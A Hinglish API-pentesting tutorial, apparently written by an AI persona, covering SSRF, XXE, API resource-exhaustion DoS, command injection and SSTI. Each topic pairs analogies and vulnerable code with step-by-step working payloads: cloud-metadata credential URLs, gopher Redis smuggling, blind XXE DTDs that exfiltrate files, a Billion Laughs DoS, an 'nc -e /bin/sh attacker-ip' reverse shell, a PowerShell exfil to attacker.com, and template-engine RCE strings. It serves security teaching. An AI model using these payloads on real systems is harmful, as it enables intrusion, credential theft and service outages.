Maano tum ek bade office mein ho. Andar bahut saare confidential files rakhe hain jo public ko nahi dikhni chahiye. Tum bahar se andar nahi ja sakte. Lekin office ka ek **peon (chaukidar)** hai jo bahar se bula sakte ho—wo andar jaakar koi bhi file laa sakta hai. Tum peon ko kehte ho: "*Jaakar room number 5 se file le aao*". Peon andar jaata hai, file laata hai, tumhe de deta hai. Tumne seedha andar toh nahi dekha, par peon ke through kar liya. SSRF bhi yahi hai—**attacker server ko kisi aur server (internal/external) par request bhejne ke liye use karta hai**, aur response (agar mila to) dekh leta hai.

#### 3. 📖 Technical Definition
SSRF tab hota hai jab API kisi **URL ko fetch** karne ki functionality provide karti hai (jaise image upload, webhook, file fetch), aur attacker is URL ko manipulate karke **internal resources** (localhost, internal network, cloud metadata) par request bhej sakta hai. Isse internal services ka data leak ho sakta hai, port scan ho sakta hai, ya cloud credentials chori ho sakte hain.

#### 4. 🧠 Zaroorat Kyun Hai?
SSRF modern cloud environments mein **bahut khatarnak** hai, kyunki:
- Cloud metadata se IAM credentials chura sakte ho (AWS, GCP, Azure)
- Internal network scan kar sakte ho (jahan firewall ke peeche services hain)
- Internal services ko attack kar sakte ho (like Redis, Elasticsearch, internal admin panels)
- Blind SSRF se internal network mapping kar sakte ho

#### 5. 🔍 Visual - Screen Par Kya Dikhega
**Normal Request:**
```
POST /api/fetch-image
Content-Type: application/json

{
  "url": "https://example.com/image.jpg"
}
```
**Vulnerable Request (Metadata):**
```
{
  "url": "http://169.254.169.254/latest/meta-data/"
}
```
Response: `200 OK` with AWS metadata (IAM role, credentials, etc.)

#### 6. ⚙️ Under the Hood
Server ka code kuch is tarah ho sakta hai:
```python
# VULNERABLE CODE
import requests

@app.route('/fetch-image', methods=['POST'])
def fetch_image():
    url = request.json['url']
    # Directly fetching user-supplied URL - VULNERABLE!
    response = requests.get(url)
    return response.content
```
Server kisi bhi URL par request bhej raha hai, including internal IPs.

#### 7. 💻 Hands-On Step-by-Step

**Step 1: SSRF ke Possible Endpoints Dhoondo**
Endpoints jo URL accept karte hain:
- `?image_url=`, `?file=`, `?path=`, `?url=`, `?webhook=`
- POST body mein `{"url": "...", "uri": "...", "endpoint": "..."}`
- File uploads jo remote URL se fetch karte hon

**Step 2: Internal IPs aur Metadata Try Karo**

**AWS Metadata (classic):**
```
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/meta-data/iam/security-credentials/<role-name>
```

**GCP Metadata:**
```
http://metadata.google.internal/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
```
(Header required: `Metadata-Flavor: Google`)

**Azure Metadata:**
```
http://169.254.169.254/metadata/instance?api-version=2017-08-01
```
(Header required: `Metadata: true`)

**Internal Services:**
```
http://localhost:8080/
http://127.0.0.1:22/
http://127.0.0.1:3306/ (MySQL)
http://192.168.1.1/admin
http://10.0.0.1:9200/ (Elasticsearch)
```

**Step 3: Blind SSRF (Jab Response Na Dikhe)**
Agar response mein data nahi dikhta (image hi aati hai ya error generic hai), to Blind SSRF ho sakta hai.

1. **Burp Collaborator** ya **https://webhook.site** use karo.
2. Apna custom URL bhejo: `http://YOUR.BURP.COLLABORATOR.URL/test`
3. Collaborator mein request aayi? Matlab SSRF present hai (blind).

4. Internal network ke liye time-based attack:
   - `http://192.168.1.1:22` – agar response time zyada hai, to port open ho sakta hai (connection timeout vs reject mein farak)
   - Burp Intruder se port scan karo: `http://127.0.0.1:§80§`

**Step 4: Protocol Smuggling**
Kai baar sirf HTTP allowed ho, par `file://`, `gopher://`, `dict://` bhi try karo:
- `file:///etc/passwd`
- `gopher://localhost:6379/_*2%0d%0a$4%0d%0aINFO%0d%0a` (Redis interaction)

#### 8. ✅ Kaamyabi ki Nishani (Success vs Failure)

| **Situation** | **Response** |
|---------------|--------------|
| **Success (Metadata)** | 200 OK ke saath AWS credentials, IAM role names, etc. |
| **Success (Internal Service)** | 200 OK ya error message jo internal service ka banner bataye (jaise "MySQL", "Elasticsearch") |
| **Blind SSRF Success** | Collaborator ya webhook.site par HTTP request aaye |
| **Failure** | 400 Bad Request, "Invalid URL", ya 200 OK but same normal response (blind case mein collaborator par kuch na aaye) |

#### 9. ⚖️ Comparison (SSRF Types)
| **Regular SSRF** | **Blind SSRF** |
|------------------|-----------------|
| Response directly milta hai (data leak) | Response nahi milta, sirf request jaati hai |
| Easy to exploit, high impact | Difficult to exploit, need out-of-band channel |
| Example: Metadata credentials leak | Example: Internal port scan via time difference ya DNS callback |

#### 10. 🚫 Common Mistakes
- Sirf localhost try karna, metadata bhool jana.
- Blind SSRF ignore karna (agar response mein data nahi dikhta to sochna ki vulnerable nahi hai).
- `file://` protocol na try karna.
- Cloud-specific headers bhoolna (GCP, Azure require specific headers).
- Internal IP ranges na fuzz karna (192.168., 10., 172.16-31.).

#### 11. 🤔 Agar Dimag Ghoom Rahe Hai?
- **"Server ne localhost block kar rakha hai, to safe hoon?"**
  DNS rebinding attack try karo. Domain banwao jo pehle external IP de, phir internal. Ya IPv6 try karo agar IPv4 block ho.
- **"Response mein data nahi aa raha, to SSRF nahi hai?"**
  Blind SSRF ho sakta hai. Out-of-band channel se confirm karo.
- **"Metadata endpoint block hai, ab kya?"**
  Internal network scan karo. Koi internal service vulnerable ho sakti hai (like Jenkins, Kibana) jisse aage badh sakte ho.

#### 12. 🌍 Real-World Use Case
**Capital One breach (2019)** – ek attacker ne SSRF ke through AWS metadata endpoint se IAM credentials chura liye, jisse 100 million+ customers ka data leak hua. Ye SSRF ka classic example hai.

#### 13. 🎨 Visual Diagram (ASCII Art)
```
[Attacker] --> POST /fetch-image { "url": "http://169.254.169.254/latest/meta-data/" }
   |
   v
[Server] --> Server-side request: GET http://169.254.169.254/latest/meta-data/
   |
   v
[AWS Metadata] --> Returns IAM role credentials
   |
   v
[Server] --> Forwards credentials to attacker in response
   |
   v
[Attacker] gets AWS keys
```

#### 14. 🛠️ Best Practices (Pro Tips)
- **Burp Intruder** se internal IP ranges fuzz karo – `http://192.168.§1§.§1§:8080`
- **SSRFmap** tool use karo automated exploitation ke liye.
- **DNS Rebinding** attack ke liye `rbndr.us` jaise services use karo.
- **Cloud metadata endpoints ki list** yaad rakho (AWS, GCP, Azure, DigitalOcean, etc.)
- **Time-based port scan** ke liye Burp mein `grep - extract` use karo response time measure karne ke liye.

#### 15. ❓ FAQ (Interview Q&A)
1. **Q:** SSRF se kaise bachein?
   **A:** URL allowlist karo (sirf trusted domains), ya IP blacklist karo (localhost, private IPs). Agar possible ho to URL fetch functionality hi mat do.
2. **Q:** Blind SSRF mein data kaise exfiltrate karein?
   **A:** DNS exfiltration – apne domain par request bhejo jisme data ho: `http://attacker.com/` + encoded data. Ya collaborator ke through.
3. **Q:** AWS metadata endpoint ka IP kya hai?
   **A:** `169.254.169.254` (link-local address). Ye hamesha yaad rakho.
4. **Q:** SSRF aur CSRF mein kya antar hai?
   **A:** SSRF mein server doosre server par request bhejta hai. CSRF mein user ke browser se request bhejwaate hain.
5. **Q:** Protocol handlers (file://, gopher://) kyun use karte hain?
   **A:** Jab HTTP blocked ho, to internal services par attack karne ke liye. Jaise `file:///etc/passwd` se files read, `gopher://` se Redis/Talk interact.

#### 16. 📝 Ek Line Mein Yaad Rakhne Ko
**"SSRF mein server hamara peon ban jaata hai, jo andar ke confidential files le aata hai."**

---

### Topic 4.4: XXE (XML External Entity)

---

#### 1. 🎯 Title
**XXE (XML External Entity)** – XML ka Bhoot

#### 2. 🐣 Samjhane ke liye (Analogy)
Maano tum kisi dukaan par gaye ho aur manager se kehte ho: "*Mujhe ek parcel chahiye jisme ye cheezein hon*". Tum ek **form** bhar kar dete ho. Form mein tum likh sakte ho ki "*parcel ke andar ek aur parcel rakh do jo doosre store se aaye*". Manager agar bewakoof hai, to wo tumhari baat maan kar doosre store se parcel mangwa lega aur tumhe de dega. XXE bhi yahi hai—**XML document mein external entity define karte hain jo server par file read kar leti hai ya doosre servers se request kar leti hai**.

#### 3. 📖 Technical Definition
XXE tab hota hai jab API **XML input parse** karti hai aur **external entities** ko resolve kar deti hai. Attacker XML mein apni entity define karta hai jo:
- Local files read kar sake (`file:///etc/passwd`)
- Internal network requests kar sake (SSRF)
- Denial of Service kar sake (Billion Laughs attack)

#### 4. 🧠 Zaroorat Kyun Hai?
XXE purani vulnerability hai, par aaj bhi milti hai, khaas kar un APIs mein jo legacy systems se baat karti hain ya jo `Content-Type: application/xml` accept karti hain. Isse:
- Server ki files padh sakte ho (source code, config files)
- SSRF kar sakte ho (internal network scan)
- DoS kar sakte ho

#### 5. 🔍 Visual - Screen Par Kya Dikhega
**Normal XML Request:**
```xml
POST /api/products HTTP/1.1
Content-Type: application/xml

<product>
  <name>Laptop</name>
  <price>50000</price>
</product>
```
**Vulnerable Request (File Read):**
```xml
<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<product>
  <name>&xxe;</name>
  <price>50000</price>
</product>
```
Response mein `/etc/passwd` ka content aayega!

#### 6. ⚙️ Under the Hood
Server ka code kuch is tarah ho sakta hai:
```java
// VULNERABLE CODE (Java)
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
// External entities enabled by default in some parsers!
DocumentBuilder db = dbf.newDocumentBuilder();
Document doc = db.parse(request.getInputStream()); // VULNERABLE!
```
Parser external entity ko resolve karta hai aur file read kar leta hai.

#### 7. 💻 Hands-On Step-by-Step

**Step 1: Technology Detection**
1. Content-Type check karo—`application/xml`, `text/xml` accept karta hai kya?
2. Agar JSON API hai, to bhi try karo `Content-Type: application/xml` change karke—kai baar server dono accept karta hai.

**Step 2: Basic XXE (File Read)**
```xml
<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>
  <data>&xxe;</data>
</root>
```
Response mein file content dikhega to success.

**Step 3: Blind XXE (Out-of-Bound)**
Agar response mein data nahi dikhta, to Blind XXE try karo:

1. Apna Burp Collaborator URL lo.
2. Payload:
   ```xml
   <?xml version="1.0"?>
   <!DOCTYPE root [
     <!ENTITY % xxe SYSTEM "http://COLLABORATOR_URL/test">
     %xxe;
   ]>
   <root>test</root>
   ```
3. Collaborator par request aayi? XXE present hai.

**Step 4: Data Exfiltration via Blind XXE**
File content exfiltrate karne ke liye:
```xml
<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % dtd SYSTEM "http://COLLABORATOR_URL/evil.dtd">
  %dtd;
]>
<root>test</root>
```
Evil DTD (apne server par hosted):
```xml
<!ENTITY % all "<!ENTITY send SYSTEM 'http://COLLABORATOR_URL/?data=%file;'>">
%all;
```
Isse file content URL parameter mein bhej diya jayega.

**Step 5: SSRF via XXE**
```xml
<!DOCTYPE root [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>
<root>&xxe;</root>
```

**Step 6: DoS (Billion Laughs)**
```xml
<!DOCTYPE root [
  <!ENTITY lol "lol">
  <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
  ...
]>
<root>&lol9;</root>
```

#### 8. ✅ Kaamyabi ki Nishani (Success vs Failure)
- **Success**: Response mein file content (jaise /etc/passwd) ya Collaborator par request.
- **Failure**: Error "DOCTYPE is not allowed", "External entities disabled", ya 200 OK with normal data.

#### 9. ⚖️ Comparison (XXE vs SSRF)
| **XXE** | **SSRF** |
|---------|----------|
| XML ke through hota hai | Kisi bhi URL parameter ke through |
| Files bhi padh sakta hai | Mostly HTTP requests |
| Blind exfiltration possible with DTD | Blind possible with out-of-band |
| DoS bhi kar sakta hai | DoS rare |

#### 10. 🚫 Common Mistakes
- Sirf file read try karna, blind XXE ignore karna.
- DTD externally host na karna (blind exfiltration ke liye).
- Content-Type change karna bhoolna (agar JSON API ho to XML bhejna hai).
- Parameter entities (`%`) aur general entities (`&`) ka antar na samajhna.

#### 11. 🤔 Agar Dimag Ghoom Rahe Hai?
- **"XML nahi use karte, to XXE nahi hoga?"**
  API JSON use karti hai, lekin agar server ne accidentally XML parsing bhi enable kar rakha ho to `Content-Type: application/xml` bhej kar check karo.
- **"Error aaya 'DOCTYPE not allowed', to safe hoon?"**
  Parser ne DOCTYPE block kiya, lekin external entities alag se enable ho sakti hain? Kam possibility hai, but still try karo without DOCTYPE.
- **"Blind XXE mein file ka content kaise le kar jaaun?"**
  Apne server par ek DTD file host karo jo file content ko HTTP request mein bhej de.

#### 12. 🌍 Real-World Use Case
**Facebook bug bounty 2013** mein ek researcher ne XXE ke through internal server files read kar li. Facebook ne $30,000 ka bounty diya tha.

#### 13. 🎨 Visual Diagram (ASCII Art)
```
[Attacker] --> POST XML with <!ENTITY xxe SYSTEM "file:///etc/passwd">
   |
   v
[XML Parser] --> Resolves entity: reads /etc/passwd
   |
   v
[Server] --> Puts file content in response
   |
   v
[Attacker] gets /etc/passwd content
```

#### 14. 🛠️ Best Practices (Pro Tips)
- **Content-Type change karo** – agar JSON API hai, to bhi XML try karo.
- **Burp Intruder** se different XML payloads fuzz karo.
- **Out-of-band server** ready rakho (Collaborator, webhook.site, ya apna VPS).
- **Parameter entities** (`%`) ka use karo blind attacks ke liye.
- **Billion Laughs** attack se DoS testing bhi karo (carefully).

#### 15. ❓ FAQ (Interview Q&A)
1. **Q:** XXE se kaise bachein?
   **A:** XML parser mein external entities disable karo. Disable DTDs completely. Use least privilege principle.
2. **Q:** Blind XXE mein data kaise exfiltrate karein?
   **A:** Parameter entities ke through apne server par hosted DTD se file content nikaalo aur HTTP request mein bhejo.
3. **Q:** `file://` protocol se kaunsi files padh sakte hain?
   **A:** /etc/passwd, /etc/hosts, source code files, config files. Windows mein `file:///c:/windows/win.ini`.
4. **Q:** XXE aur XEE mein kya antar hai?
   **A:** XEE (XML Entity Expansion) Billion Laughs attack hai jo DoS ke liye hota hai. XXE mein external entities se file read/SSRF hota hai.
5. **Q:** Agar XML parser DTDs disable hai, to kya XXE possible nahi?
   **A:** Mostly nahi. Lekin kuch parsers mein doctype allow ho sakta hai lekin external entities disable. Tab bhi internal DTDs se error-based extraction possible hai (rare).

#### 16. 📝 Ek Line Mein Yaad Rakhne Ko
**"XXE mein XML ke andar ek bhoot (entity) bitha dete hain jo server ki files chura leta hai."**

---

### 🎯 Bonus: Unrestricted Resource Consumption (DoS)

#### 1. 🎯 Title
**Unrestricted Resource Consumption / API DoS**

#### 2. 🐣 Samjhane ke liye (Analogy)
Maano ek chai ki dukaan hai. Ek aadmi aata hai aur kehta hai "*ek chai banao*". Wo banti hai. Doosra aata hai, teesra aata hai. Dukaan sambhalti hai. Lekin agar ek aadmi aake kehta hai "*5000 chai banao ek saath*", to dukaan ka saara saman khatam ho jayega, gas khatam, cup khatam, aur baaki customers ko chai nahi milegi. Yahi DoS attack hai—**ek user ne itni zyada resources maang li ki doosre users ke liye service down ho gayi**.

#### 3. 📖 Technical Definition
Unrestricted Resource Consumption tab hota hai jab API kisi bhi user ko **unlimited resources consume karne ki permission de deti hai** bina rate limiting ke. Jaise:
- Ek request mein 1000 objects fetch kar sakte hain
- Ek minute mein 10,000 requests bhej sakte hain
- GraphQL mein depth limit nahi hai, to nested queries daal sakte hain

#### 4. 🧠 Zaroorat Kyun Hai?
Ye business logic flaw hai jisse:
- Service down ho sakti hai (DoS)
- Server ka bill badh sakta hai (cloud environment mein)
- Doosre users ki performance affect ho sakti hai

#### 5. 🔍 Visual - Screen Par Kya Dikhega
```
POST /api/users/batch
{
  "ids": [1,2,3,4,5,6,7,8,9,10..... 10000]
}
```
Agar server ne 10000 IDs process kar li, to resource consumption issue hai.

#### 6. ⚙️ Under the Hood
Server mein koi check nahi ki ek baar mein kitne items fetch kar sakte hain.

#### 7. 💻 Hands-On Step-by-Step
1. **Batching abuse**: Endpoints jo arrays accept karte hain, unmein zyada se zyada items daal kar dekho.
2. **Pagination abuse**: `?page=1000&limit=1000` try karo.
3. **GraphQL**: Depth query, recursive queries.
4. **Rate limiting check**: Ek minute mein kitni requests bhej sakte hain?

#### 8. ✅ Kaamyabi ki Nishani
Server slow ho jaye, 503 errors aane lage, ya response time badh jaye.

#### 9. 🛠️ Pro Tips
- **Turbo Intruder** use karo high-speed requests ke liye.
- **GraphQL** mein `__schema` introspection ke saath depth attacks.

---

Bilkul, bhai! 🚀 Ab main "TechGuru" ke roop mein **Topic 4.5 se 4.9** ka ekdum **Zero-Confusion Industry-Grade Notes** de raha hoon. Har topic ko 16-point structure mein tod-tod ke samjhaunga, chai-wali analogy se lekar PoC tak. Taiyaar ho? Chaliye shuru karte hain!

---

## 🧩 Module 4: Injection & Resource-Based Attacks (Deep Dive)

---

### Topic 4.5: Command Injection

#### 1. 🎯 Title: Command Injection – Jab API Seedha Server Ke Shell Se Baat Kare

#### 2. 🐣 Samjhane ke liye (Analogy)
Maan lo tum ek **cyber cafe** mein ho aur wahan ka manager tumse kehta hai ki "Website ka naam likho, main check karunga ki wo block hai ya nahi." Tum "google.com" likhte ho, wo apne computer pe `ping google.com` command chala ke result deta hai. Ab agar tum likho `google.com; dir` aur manager bina soche wahi command chala de, toh uski machine ka **directory listing** tumhe dikh jayega. Yahi hai Command Injection – user ke input ko bina sanitize kiye system command mein chipka diya.

#### 3. 📖 Technical Definition
Command Injection ek critical vulnerability hai jahan attacker unsanitized user input ko server-side system command mein inject kar deta hai. Jab API kisi external command ko execute karti hai (jaise ping, nslookup, ffmpeg) aur user ke input ko directly command mein concatenate karti hai, toh attacker apni marzi ki OS commands chala sakta hai.

#### 4. 🧠 Zaroorat Kyun Hai?
Is vulnerability se attacker server par **Remote Code Execution (RCE)** achieve kar sakta hai. Matlab poori machine par control. Data steal kar sakta hai, malware install kar sakta hai, ya poori system ko down kar sakta hai. API pentesting mein yeh **critical severity** hota hai.

#### 5. 🔍 Visual - Screen Par Kya Dikhega
- **Burp Suite / Browser**: Koi endpoint dikhega jaise:
  ```
  GET /api/ping?host=8.8.8.8
  POST /api/convert
  Body: {"file":"test.pdf"}
  ```
- Response mein genrally command ka output reflect hota hai. Jaagar command ka output na bhi dikhe, toh blind injection ho sakti hai.

#### 6. ⚙️ Under the Hood
Server kuch aisa code likhta hoga (e.g., in PHP):
```php
$host = $_GET['host'];
system("ping -c 4 " . $host);
```
Yahan `$host` directly command mein concatenate ho raha hai. Attacker `; ls -la` bhejega toh actual command banegi:
```
ping -c 4 ; ls -la
```
Shell `;` ko command separator samajh kar pehle ping chalaega, phir ls.

#### 7. 💻 Hands-On Step-by-Step

**Step 1: Identify potential injection points**
- Endpoints dhundho jo filenames, hostnames, IPs, ya kisi bhi external resource ke saath interaction karte hain.
- Examples: `/util/ping?ip=8.8.8.8`, `/api/download?file=report.pdf`, `/convert?url=http://example.com`.

**Step 2: Initial probe – Command separators**
- Simple payload bhejo jisse command execute ho jaaye, jaise:
  - `; ls`
  - `| whoami`
  - `|| dir`
  - `& id`
  - `` `id` ``
  - `$(id)`
- Agar response mein command ka output (jaise directory listing, user name) dikhe, toh injection confirmed.

**Step 3: Blind injection testing**
- Agar output na dikhe, toh time-based ya out-of-band (OOB) try karo.
  - `; ping -c 10 127.0.0.1` (response mein delay)
  - `; nslookup attacker-controlled.com` (DNS log check)

**Step 4: Exploit further**
- Ek baar confirm ho jaaye, toh reverse shell ya data exfiltration ka payload bhejo.

**Example payloads:**
- Linux: `; nc -e /bin/sh attacker-ip 4444`
- Windows: `| powershell -c "Invoke-WebRequest -Uri http://attacker.com/?data=$(whoami)"`

#### 8. ✅ Kaamyabi ki Nishani (Success vs Failure)
- **Success Response**: Command ka output response mein dikhe, jaise:
  ```
  {"output": "total 32\n-rw-r--r-- 1 user user ..."}
  ```
  Ya response time mein abnormal delay ho.
- **Failure Response**: Same response aaye jaise normal request pe. Agar error aaye toh bhi injection ka chance ho sakta hai (jaise "ping: unknown host ; ls").

#### 9. ⚖️ Comparison: Command Injection vs SQL Injection
| Command Injection | SQL Injection |
|-------------------|---------------|
| OS commands inject hoti hain | SQL queries inject hoti hain |
| Target: Server OS | Target: Database |
| Separators: `;`, `\|`, `&`, `` ` ``, `$()` | Separators: `'`, `"`, `--`, `#` |
| Impact: RCE, full system compromise | Impact: Data leak, authentication bypass |

#### 10. 🚫 Common Mistakes
- Sirf `;` try karke chhod dena. Dhyan rakho ki alag systems alag separators treat karte hain (Windows pe `&` kaam karta hai, Linux pe `;`).
- Output na dikhe to blind injection test nahi karte. Hamesha OOB aur time-based try karo.
- URL encoding bhoolna. Payload mein spaces aur special characters ko encode karo.

#### 11. 🤔 Agar Dimag Ghoom Rahe Hai?
- **"Agar server command ka output nahi dikha raha, toh bhi injection ho sakta hai?"**
  Haan, blind injection ho sakti hai. Time delays ya DNS requests se confirm karo.
- **"Kya har API jo ping karti hai vulnerable hoti hai?"**
  Nahi, agar input properly sanitized ho ya allowlist based ho, toh safe ho sakti hai.
- **"Mein ne `; ls` bheja toh error aaya 'ping: ; ls: Name or service not known'."**
  Iska matlab server ne poori string command mein daal di, lekin shell ne `;` treat nahi kiya? Ho sakta hai ki input validation ho. Try karo `| ls` ya `$(ls)`.

#### 12. 🌍 Real-World Use Case
**Bug Bounty Example**: Ek popular file conversion API mein `/convert?url=...` endpoint tha. Attacker ne `; cat /etc/passwd` bheja aur server ne response mein passwd file return kar di. Isse usne critical RCE paya aur bounty $5000 mila.

#### 13. 🎨 Visual Diagram (ASCII Art)
```
User (attacker) --[; ls]--> API Server
                           |
                           v
                    [system("ping ; ls")]
                           |
                           v
                    Shell executes:
                    1. ping (fails)
                    2. ls (output)
                           |
                           v
                    Response contains directory listing
```

#### 14. 🛠️ Best Practices (Pro Tips)
- **Burp Suite Intruder**: Fuzzing ke liye command injection wordlist use karo.
- **Special characters**: Pehle simple `;` aur `|` try karo, phir encoded versions.
- **Out-of-band**: Burp Collaborator ya Interact.sh ka use karo blind injection ke liye.
- **Time-based**: `sleep 10` (Linux) ya `ping -n 10 127.0.0.1` (Windows) use karo.

#### 15. ❓ FAQ (Interview-Style)
1. **Q: Command injection ke liye top 5 payloads kya hain?**
   A: `; ls`, `| whoami`, `$(id)`, `` `id` ``, `|| ping -c 10 127.0.0.1`
2. **Q: Blind command injection kaise detect karenge?**
   A: Time-based (`; sleep 5`) aur out-of-band (`; nslookup collab.com`) payloads se.
3. **Q: Windows aur Linux mein kya farak hai?**
   A: Linux `;`, `|`, `||`, `` ` ``, `$()` kaam karte hain; Windows `&`, `|`, `||`, `%` use hota hai.
4. **Q: Agar response mein command output na dikhe toh bhi RCE possible hai?**
   A: Haan, blind injection se reverse shell ya file write kar sakte hain.
5. **Q: Command injection se bachne ke upaye?**
   A: User input ko allowlist karo, shell execution avoid karo, `escapeshellarg()` jaise functions use karo.

#### 16. 📝 Ek Line Mein Yaad Rakhne Ko
**"Jahan bhi API system command chala rahi ho, wahan command injection ka dar, semicolon se shuru karo intezaar."**

---

### Topic 4.6: SSTI (Server-Side Template Injection)

#### 1. 🎯 Title: SSTI – Jab Template Engine Hi Attacker Ka Jaal Ban Jaaye

#### 2. 🐣 Samjhane ke liye (Analogy)
Tumhare paas ek **greeting card wala robot** hai. Tum usse kehte ho "Hello {{name}} likh do", aur robot tumhara naam daal ke card print kar deta hai. Ab agar tum robot se kaho "Hello {{7*7}}", toh robot sochta hai ki "arey yeh template expression hai, isse evaluate karo" aur card mein **49** print kar deta hai. Yani robot ne tumhare input ko template ki tarah treat kiya. Isi tarah SSTI mein user input template engine ko evaluate karne lagta hai.

#### 3. 📖 Technical Definition
Server-Side Template Injection tab hota hai jab attacker ka input server-side template mein dynamically include ho jaata hai aur template engine use evaluate kar deta hai. Isse attacker arbitrary code execution (RCE) achieve kar sakta hai, data leak kar sakta hai, ya server ko compromise.

#### 4. 🧠 Zaroorat Kyun Hai?
Modern web applications templates use karti hain (Jinja2, Twig, Freemarker, etc.) to generate dynamic HTML. Agar input reflect hota hai bina proper escaping ke, toh SSTI se attacker server par control le sakta hai. SSTI critical vulnerability hai jo directly RCE de sakti hai.

#### 5. 🔍 Visual - Screen Par Kya Dikhega
- Profile page mein username dikh raha hai: `Hello john`
- Error message mein input reflect ho raha hai: `Invalid user: john`
- Settings page mein koi field jo response mein aati ho.

#### 6. ⚙️ Under the Hood
Server ka code kuch aisa ho sakta hai (Python/Jinja2):
```python
from jinja2 import Template
name = request.args.get('name', '')
template = Template("Hello " + name)   # Direct concatenation
return template.render()
```
Yahan `name` user input hai. Agar attacker `{{7*7}}` bhejega, toh template banega `Hello {{7*7}}` aur render hote waqt 49 aa jayega.

#### 7. 💻 Hands-On Step-by-Step

**Step 1: Identify reflection points**
- Har input field dhundho jiska output response mein dikhe (profile, search, error messages).

**Step 2: Basic probe – Math expression**
- Payload bhejo: `{{7*7}}`, `${7*7}`, `{{7*'7'}}`, `{{7*'7'}}` (Jinja2 mein string repetition).
- Agar response mein `49` ya `7777777` dikhe, toh SSTI confirmed.

**Step 3: Identify template engine**
- Alag alag payloads try karo:
  - Jinja2: `{{7*7}}` → 49, `{{7*'7'}}` → 7777777
  - Twig: `{{7*7}}` → 49, `{{_self.env.registerUndefinedFilterCallback("exec")}}` etc.
  - Freemarker: `${7*7}` → 49, `<#assign ex="freemarker.template.utility.Execute"?new()>${ex("ls")}`

**Step 4: Move to RCE**
- Ek baar engine pata chal jaaye, toh uske hisaab se RCE payloads dhundho.
  - Jinja2: `{{config.__class__.__init__.__globals__['os'].popen('ls').read()}}`
  - Twig: `{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}`
  - Freemarker: `<#assign ex="freemarker.template.utility.Execute"?new()>${ex("whoami")}`

**Step 5: Test for blind SSTI**
- Agar output na dikhe, toh time-based payloads try karo: `{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}` (Jinja2) etc.

#### 8. ✅ Kaamyabi ki Nishani (Success vs Failure)
- **Success Response**: Math expression ka result dikhe (e.g., `49` ya `7777777`). Ya RCE payload se command output dikhe.
- **Failure Response**: Input exactly waise hi reflect ho jaise bheja tha (e.g., `{{7*7}}` display ho). Ya error aaye "TemplateSyntaxError".

#### 9. ⚖️ Comparison: SSTI vs XSS
| SSTI | XSS |
|------|-----|
| Server-side code execution | Client-side script execution |
| Target: Server | Target: Browser of other users |
| Payloads use template syntax (`{{...}}`) | Payloads use HTML/JS (`<script>`) |
| Impact: RCE, data breach | Impact: Session hijacking, defacement |

#### 10. 🚫 Common Mistakes
- Sirf `{{7*7}}` try karke soch lena ki SSTI nahi hai. Agar `{{7*7}}` ka result `{{7*7}}` hi dikhe, toh maybe engine escape kar raha hai, lekin double curly braces ka use karke alag syntax try karo.
- Template engine pehle identify kiye bina RCE payloads daalna.
- Blind SSTI ko ignore karna. Time-based payloads se bhi SSTI detect ho sakti hai (e.g., `{% for i in range(10) %}{{ i }}{% endfor %}` se response time badh sakta hai).

#### 11. 🤔 Agar Dimag Ghoom Rahe Hai?
- **"Math expression ka result nahi mila, toh SSTI nahi hai?"**
  Nahi, ho sakta hai ki template engine alag syntax use karta ho. Jaise Freemarker `${...}` use karta hai, Jinja2 `{{...}}`. Toh pehle syntax fuzzing karo.
- **"RCE payload itna lamba hai, kaise yaad rakhenge?"**
  Pro tip: Pehle SSTI confirm karo, phir Google ya cheatsheet se engine-specific payloads dhundho.
- **"SSTI sirf Python mein hota hai?"**
  Nahi, SSTI kisi bhi template engine mein ho sakta hai – PHP ke Twig, Java ke Freemarker, Ruby ke ERB, etc.

#### 12. 🌍 Real-World Use Case
**Example**: Uber ki ek subdomain mein SSTI thi jahan profile name field mein `{{7*7}}` daalne se response mein 49 aa gaya. Engineer ne exploit karke server ka environment variables dump kar liya. Isse critical RCE mila aur bounty $10,000.

#### 13. 🎨 Visual Diagram (ASCII Art)
```
Attacker --[{{7*7}}]--> API (profile update)
                         |
                         v
                 Template Engine (Jinja2)
                         |
                         v
              "Hello " + "{{7*7}}" → "Hello 49"
                         |
                         v
               Response contains "Hello 49"
```

#### 14. 🛠️ Best Practices (Pro Tips)
- **Fuzzing**: SSTI ke liye common syntax ki list bana lo aur Burp Intruder se fuzz karo.
- **Error analysis**: Agar SSTI payload se error aata hai, toh error message mein template engine ka naam leak ho sakta hai.
- **Tooling**: Tplmap tool use karo (lekin manually bhi samjho).
- **Time-based**: Jinja2 mein `{% for i in range(1000000) %}{{ i }}{% endfor %}` se delay aayega.

#### 15. ❓ FAQ
1. **Q: SSTI detect karne ka sabse aasan tareeka?**
   A: Pehle math expression daalo: `{{7*7}}`, `${7*7}`, `{{7*'7'}}`. Agar 49 ya 7777777 dikhe, toh SSTI.
2. **Q: SSTI se RCE kaise karein?**
   A: Template engine identify karo, phir engine-specific RCE payloads use karo. Jinja2 ke liye `{{config.__class__.__init__.__globals__['os'].popen('id').read()}}`.
3. **Q: Blind SSTI kya hota hai?**
   A: Jab SSTI ka output response mein nahi dikhta, lekin payload execute ho jata hai. Blind SQLi ki tarah, time-based ya OOB se confirm karte hain.
4. **Q: Kya SSTI mein XSS payloads bhi kaam karte hain?**
   A: SSTI ka focus server-side hai, lekin agar template raw HTML generate karta hai toh SSTI ke through XSS bhi ho sakta hai, par primary goal RCE hota hai.
5. **Q: SSTI se bachne ke liye kya karein?**
   A: User input ko template mein directly concatenate na karo, proper escaping use karo, aur template engine ko user-controlled parts ko render na karne do.

#### 16. 📝 Ek Line Mein Yaad Rakhne Ko
**"Jab bhi user input reflect ho template mein, SSTI ka khel, math expression se confirm kar le."**

---

